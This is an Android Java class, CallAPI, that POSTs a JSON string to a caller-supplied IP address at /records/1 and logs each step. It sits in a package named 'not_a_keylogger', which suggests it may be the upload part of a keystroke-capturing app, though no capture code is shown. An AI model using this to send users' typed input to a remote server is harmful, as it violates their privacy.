package com.example.not_a_keylogger;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class CallAPI extends AsyncTask<String, String, String> {

    public CallAPI(){

    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected String doInBackground(String... arg) {
        try {
            Log.i("urr : try","ttr");

            URL url = new URL("http://"+arg[1]+"/records/1");
            Log.i("urr : ",url.toString());
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true);
            //conn.setDoInput(true);

            Log.i("JSON", arg[0]);
            Log.i("IP", arg[1]);
            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(arg[0]);

            os.flush();
            os.close();

            Log.i("STATUS", String.valueOf(conn.getResponseCode()));
            Log.i("MSG" , conn.getResponseMessage());

            conn.disconnect();
        } catch (Exception e) {
            Log.i("err","err");
           Log.i("call api err : ","msg : "+e.getCause());
        }
        return "ok";
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }


}
